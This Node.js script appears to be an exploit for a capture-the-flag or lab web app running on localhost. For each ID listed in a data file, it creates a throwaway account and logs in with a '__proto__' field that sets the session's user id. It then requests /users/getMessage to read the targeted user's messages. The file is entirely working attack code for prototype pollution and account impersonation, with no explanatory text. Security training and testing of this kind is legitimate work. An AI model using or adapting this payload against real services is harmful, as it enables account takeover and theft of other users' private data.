const db = require('./db');
const async = require('async');
const request = require('request');
const fs = require('fs');

var headers = {
  'Content-type': 'application/json'
};


var idb = [];

var idb = fs.readFileSync('data.txt').toString().split("\n");
for(i in idb) {
    console.log(idb[i]);
}

console.log(idb);


function getRandomString() { 
  var result = ''; 
  while (!result) {
    result = Math.random().toString(36).substring(2); 
    return result; 
  }
};


function requestPromise(options) {
  return new Promise(function(resolve, reject) {
    request(options, function(error, response, body) {
      if(error) {
        return reject(error);
      }
      resolve(body);
    });
  });
}


async function delayedLog(postOptions1, postOptions2, getOptions) {

  // waiting until return promise
  var requestPromisePost1 = await requestPromise(postOptions1);
  var requestPromisePost2 = await requestPromise(postOptions2);
  var requestPromiseGet = await requestPromise(getOptions);

  //only print result after implement promise function
  Promise.all([
    requestPromisePost1,
    requestPromisePost2,
    requestPromiseGet
  ])
  .then(function(results) {
    console.log(results);
  })
  .catch(function(err) {
    console.log(err);
  });

}


async function process(array) {
  for(var value of array) {

    var name = getRandomString();
    var phone = getRandomString();
    var email = getRandomString() + '@gmail.com';
    var password = getRandomString();

    var dataCreateString = '{"name":' + '\"' + name + '\"' + ', "phone":' + '\"' + phone + '\"' + ', "email":' +  '\"' + email + '\"' + ', "password":' + '\"' + password + '\"' + ', "message": ""}';
    var dataString = '{"email":' + '\"' + email + '", "password":' + '\"' + password + '\"' + ', "__proto__": {"id":' + '\"' + value + '\"' + '}}';

    var postOptions1 = {
      method: 'POST',
      url: 'http://localhost:3333/users/create',
      headers: headers,
      body: dataCreateString
    };

    var postOptions2 = {
      method: 'POST',
      url: 'http://localhost:3333/auth/login',
      headers: headers,
      body: dataString
    };

    var getOptions = {
      method: 'GET',
      url: 'http://localhost:3333/users/getMessage',
      headers: headers
    };

    await delayedLog(postOptions1, postOptions2, getOptions);
  }
}

process(idb);